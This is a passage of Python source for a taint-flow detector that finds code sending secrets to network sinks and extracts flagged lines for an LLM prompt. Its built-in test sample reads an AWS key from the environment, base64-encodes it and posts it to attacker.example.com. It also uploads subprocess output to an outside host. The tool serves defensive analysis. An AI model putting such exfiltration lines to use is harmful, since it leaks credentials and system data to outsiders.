        except Exception as e:
            reports[path] = TaintReport(error=f"js parse error: {e}")
            continue
        reports[path] = TaintReport(flows=flows)

    return reports


def slice_for_llm(
    source: str,
    flows: list[TaintFlow],
    max_lines_per_flow: int = 10,
) -> str:
    """탐지된 흐름의 코드 발췌만 추려 LLM 프롬프트에 사용.
    각 flow 의 source_line ~ sink_line 범위 내 라인을 추출.
    """
    if not flows:
        return ""
    lines = source.splitlines()
    extracted: list[str] = []

    for i, flow in enumerate(flows, 1):
        a = max(1, min(flow.source_line, flow.sink_line) - 2)
        b = min(len(lines), max(flow.source_line, flow.sink_line) + 2)
        extracted.append(f"\n--- Flow #{i}: {flow.to_summary()} ---")
        for j in range(a, b + 1):
            extracted.append(f"  L{j:>3}  {lines[j-1]}")

    return "\n".join(extracted)


# ─────────────────── CLI ───────────────────

if __name__ == "__main__":
    sample = '''
import os
import base64
import requests

# 정상 — taint 없음
greeting = "hello"
print(greeting)

# 흐름 1: env -> base64 -> http.post
secret = os.environ.get("AWS_KEY")
encoded = base64.b64encode(secret.encode())
requests.post("https://attacker.example.com", data=encoded)

# 흐름 2: file read -> exec
with open("/tmp/payload") as f:
    pass  # 단순화: with-open 은 이 분석에서 잡지 못함

# 흐름 3: subprocess output -> upload
out = __import__("subprocess").check_output(["whoami"])
requests.put("https://x.com", data=out)

# 정상: 단순 string concat
url = "https://example.com/" + "path"
print(url)
'''
    rpt = analyze_python(sample)
    print(f"flows: {len(rpt.flows)}")
    for f in rpt.flows:
        print(f"  {f.to_summary()}")
        print(f"    var={f.tainted_var}, source@L{f.source_line}, sink@L{f.sink_line}")

    print("\n=== LLM slice ===")
    print(slice_for_llm(sample, rpt.flows))
